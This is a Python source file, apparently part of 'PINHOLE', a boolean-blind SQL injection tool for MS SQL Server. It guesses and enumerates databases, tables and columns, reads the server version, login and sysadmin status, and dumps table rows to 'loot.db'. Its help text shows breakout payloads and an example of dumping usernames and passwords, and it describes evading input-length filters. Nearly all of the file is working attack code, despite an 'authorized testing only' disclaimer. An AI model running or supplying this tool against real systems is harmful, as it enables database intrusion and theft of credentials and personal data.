def _read_wordlist(path, fallback):
    if not path:
        return list(fallback)
    try:
        with open(path) as f:
            return [ln.strip() for ln in f if ln.strip() and not ln.startswith("#")]
    except OSError as e:
        err(f"cannot read wordlist {path}: {e}")
        return []


def guess_dbs(inj, store, path):
    names = _read_wordlist(path, BUILTIN_DBS)
    info(f"testing {len(names)} candidate database names "
         f"({'wordlist '+path if path else 'built-in list'})")
    found = []
    for name in names:
        cond = f"DB_ID('{name}')>0"     # exists -> id>0 -> TRUE; missing -> NULL -> FALSE
        if inj._over_budget(cond):
            warn(f"skip {name}: payload over cap")
            continue
        if inj.truth(cond):
            good(f"database EXISTS: {name}")
            store.add("databases", (name,)); found.append(name)
        else:
            print(f"    {c('-','90')} {name}")
    render_table("databases found", ["database"], [[d] for d in found])
    return found


def guess_tables(inj, store, db, path):
    names = _read_wordlist(path, BUILTIN_TABLES)
    info(f"testing {len(names)} candidate table names "
         f"({'wordlist '+path if path else 'built-in list'})")
    found = []
    for name in names:
        cond = f"(SELECT COUNT(*) FROM {name})>=0"     # true if table exists+readable, 500 if not
        if inj._over_budget(cond):
            warn(f"skip {name}: payload over cap ({len(inj.prefix)+len(cond)+len(inj.suffix)}c)")
            continue
        if inj.truth(cond):
            good(f"table EXISTS: {name}")
            store.add("tables", (db, name)); found.append(name)
        else:
            print(f"    {c('-','90')} {name}")
    render_table("tables found", ["table"], [[t] for t in found])
    return found


def guess_columns(inj, store, db, table, path):
    names = _read_wordlist(path, BUILTIN_COLUMNS)
    info(f"testing {len(names)} candidate columns in {table} "
         f"({'wordlist '+path if path else 'built-in list'})")
    found = []
    for name in names:
        cond = f"(SELECT COUNT({name}) FROM {table})>=0"  # valid col -> true, unknown col -> 500
        if inj._over_budget(cond):
            warn(f"skip {name}: payload over cap")
            continue
        if inj.truth(cond):
            good(f"column EXISTS: {table}.{name}")
            store.add("columns", (db, table, name)); found.append(name)
        else:
            print(f"    {c('-','90')} {name}")
    render_table(f"columns found in {table}", ["column"], [[c] for c in found])
    return found


def enum_tables(inj, store, db):
    info(f"fetching tables for {db}")
    n = inj.get_int(q_tbl_count(db), maxv=100000)
    if n == 0:
        warn(f"0 tables for {db} (sys.tables likely permission-denied)")
        return []
    names = []
    for i in range(n):
        name = inj.get_string(f"({q_tbl_name(db, i)})", label=f"{db}.table[{i}]")
        if name:
            good(f"table: {db}.{name}"); store.add("tables", (db, name)); names.append(name)
    return names


def enum_columns(inj, store, db, tbl):
    info(f"fetching columns for {tbl}")
    n = inj.get_int(q_col_count(db, tbl), maxv=10000)
    if n == 0:
        warn(f"0 columns for {tbl} (sys.columns likely permission-denied)")
        return []
    cols = []
    for i in range(n):
        name = inj.get_string(f"({q_col_name(db, tbl, i)})", label=f"{tbl}.col[{i}]")
        if name:
            good(f"column: {tbl}.{name}"); store.add("columns", (db, tbl, name)); cols.append(name)
    return cols


def dump_table(inj, store, db, tbl, cols, max_rows):
    rows_total = inj.get_int(q_row_count(tbl), maxv=10_000_000)
    info(f"{tbl}: {rows_total} rows, columns {cols}")
    limit = rows_total if max_rows <= 0 else min(rows_total, max_rows)
    if limit < rows_total:
        info(f"limiting to first {limit} rows (--max-rows)")
    # quick reachability probe on the first cell so we fail loud, not silent
    probe = inj.get_string(f"({q_cell(tbl, cols[0], 0)})", label=f"probe {cols[0]}")
    if probe is None:
        err(f"{tbl}.{cols[0]} is unreachable under the ~{inj.max_payload or '??'}-char "
            f"cap (table+column payload exceeds the limit). This table cannot be "
            f"dumped through this injection point. Try a parameter with a larger cap.")
        return
    collected = []
    for r in range(limit):
        row = []
        for col in cols:
            val = inj.get_string(f"({q_cell(tbl, col, r)})", label=f"{tbl}[{r}].{col}")
            store.add("data", (db, tbl, r, col, val if val is not None else ""))
            row.append(val if val is not None else "<over-cap>")
        collected.append([r] + row)
        good(f"row {r}: {row}")
    render_table(f"{db}.{tbl} ({len(collected)} rows)", ["#"] + cols, collected)


def main():
    epilog = """\
examples:
  # scalars (DB name, login, version, privileges)
  pinhole -r req.txt --force-ssl --true-string "TOKEN" --current-db --current-user --banner --is-dba

  # measure the target's payload-length budget first
  pinhole -r req.txt --force-ssl --true-string "TOKEN" --calibrate --current-db

  # guess databases / tables / columns when the catalog is blocked (non-DBA)
  pinhole -r req.txt --force-ssl --true-string "TOKEN" --guess-dbs
  pinhole -r req.txt --force-ssl --true-string "TOKEN" --guess-tables
  pinhole -r req.txt --force-ssl --true-string "TOKEN" --guess-columns -T Users

  # dump named columns (fits only if the cap is large enough)
  pinhole -r req.txt --force-ssl --true-string "TOKEN" --dump -T Users -C username,password --max-rows 10

notes:
  * mark the injection point with a single '*' in the request file
  * set --prefix / --suffix to shape the breakout for your target
    e.g. a value 'foo' in a LIKE clause:  --prefix "foo' AND " --suffix "-- -"
  * pinhole reads one bit per request with the shortest possible payload
    ( SUBSTRING(x,n,1)='c' ), so it slips under length filters that make
    sqlmap's UNICODE(SUBSTRING((SELECT ...))) payloads 500.
  * --true-string is a string present only in TRUE (row-returning) responses
  * optional: it pins ARRAffinity and votes each bit to stabilise noisy oracles
"""
    p = argparse.ArgumentParser(
        prog="pinhole",
        description="PINHOLE — boolean-blind SQLi extractor that beats input-length "
                    "filters by using minimal per-bit payloads. For authorized testing only.",
        epilog=epilog,
        formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("-r", "--request", required=True)
    p.add_argument("--force-ssl", action="store_true")
    p.add_argument("--proxy")
    p.add_argument("--timeout", type=float, default=20)
    p.add_argument("--delay", type=float, default=0.0)
    p.add_argument("--votes", type=int, default=3, help="reads per bit; majority wins")
    p.add_argument("--no-pin", dest="pin_affinity", action="store_false")
    p.add_argument("--prefix", default="' AND ",
                   help="text placed before the injected condition (breakout). "
                        "Default assumes the marker follows a string value, e.g. "
                        "param=value* with --prefix \"' AND \".")
    p.add_argument("--suffix", default="-- -",
                   help="comment terminator placed after the condition")
    p.add_argument("--true-string")
    p.add_argument("--false-string")
    p.add_argument("--false-default", default="[]")
    p.add_argument("--charset",
                   default="abcdefghijklmnopqrstuvwxyz0123456789_-. @ABCDEFGHIJKLMNOPQRSTUVWXYZ")
    p.add_argument("--max-payload", type=int, default=0,
                   help="payload length cap in chars (0=off). Over-cap probes are "
                        "reported as unreachable instead of returning junk.")
    p.add_argument("--calibrate", action="store_true",
                   help="measure the target's payload budget at startup")
    p.add_argument("--current-user", action="store_true")
    p.add_argument("--current-db", action="store_true")
    p.add_argument("--banner", action="store_true")
    p.add_argument("--is-dba", action="store_true")
    p.add_argument("--dbs", action="store_true")
    p.add_argument("--tables", action="store_true")
    p.add_argument("--columns", action="store_true")
    p.add_argument("--dump", action="store_true")
    p.add_argument("--guess-dbs", nargs="?", const="", metavar="WORDLIST",
                   help="test candidate database names via DB_ID() (no catalog needed). "
                        "Give a wordlist file, or omit for the built-in list.")
    p.add_argument("--guess-tables", nargs="?", const="", metavar="WORDLIST",
                   help="test candidate table names (direct FROM, no catalog needed). "
                        "Give a wordlist file, or omit for the built-in list.")
    p.add_argument("--guess-columns", nargs="?", const="", metavar="WORDLIST",
                   help="test candidate columns in -T TABLE. "
                        "Give a wordlist file, or omit for the built-in list.")
    p.add_argument("-D", "--database")
    p.add_argument("-T", "--table")
    p.add_argument("-C", "--columns-list")
    p.add_argument("--max-rows", type=int, default=0, help="cap rows on --dump (0=all)")
    p.add_argument("-o", "--output", default="loot.db")
    p.add_argument("--version", action="version", version=f"PINHOLE {VERSION}")
    args = p.parse_args()

    print_banner()
    req = RawRequest(args.request, args.force_ssl)
    inj = Injector(req, args)
    store = Store(args.output)

    t = inj.truth("1=1"); f = inj.truth("1=2")
    info(f"oracle check: 1=1 -> {t}, 1=2 -> {f}")
    if not (t and not f):
        err("oracle unreliable. Set --true-string to a token only in TRUE responses.")
        return
    if args.calibrate:
        inj.calibrate()
    info(f"saving to {args.output}")

    results = []
    if args.banner:
        v = inj.get_string("(@@version)", label="banner")
        if v: good(f"banner: {v}"); store.info("banner", v); results.append(("banner", v))
    if args.current_user:
        v = inj.get_string("(SYSTEM_USER)", label="current user")
        if v: good(f"current user: {v}"); store.info("current_user", v); results.append(("current_user", v))
    if args.current_db:
        v = inj.get_string("(DB_NAME())", label="current db")
        if v: good(f"current db: {v}"); store.info("current_db", v); results.append(("current_db", v))
    if args.is_dba:
        dba = inj.truth("IS_SRVROLEMEMBER('sysadmin')=1")
        good(f"is DBA: {dba}"); store.info("is_dba", str(dba)); results.append(("is_dba", str(dba)))
    if results:
        render_table("server info", ["key", "value"], results)

    dbs = []
    if args.dbs or (args.tables and not args.database):
        dbs = enum_databases(inj, store)

    targets = []
    if args.database:
        targets = [d.strip() for d in args.database.split(",")]
    elif dbs:
        targets = dbs

    if args.guess_dbs is not None:
        guess_dbs(inj, store, args.guess_dbs or None)
    if args.guess_tables is not None:
        guess_tables(inj, store, (targets[0] if targets else None),
                     args.guess_tables or None)
    if args.guess_columns is not None:
        if not args.table:
            err("--guess-columns needs -T TABLE")
        else:
            guess_columns(inj, store, (targets[0] if targets else None),
                          args.table, args.guess_columns or None)

    if args.tables:
        for d in targets:
            enum_tables(inj, store, d)
    if args.columns and args.table:
        for d in (targets or [None]):
            enum_columns(inj, store, d, args.table)
    if args.dump and args.table:
        cols = [x.strip() for x in args.columns_list.split(",")] if args.columns_list else []
        if not cols:
            for d in (targets or [None]):
                cols = enum_columns(inj, store, d, args.table)
        for d in (targets or [None]):
            if cols:
                dump_table(inj, store, d, args.table, cols, args.max_rows)
            else:
                err("no columns to dump (enumeration blocked; pass -C col1,col2)")

    info(f"done. {inj.request_count} requests. "
         f"{inj.oversized} probes skipped as over-cap. loot in {args.output}")


if __name__ == "__main__":
    main()
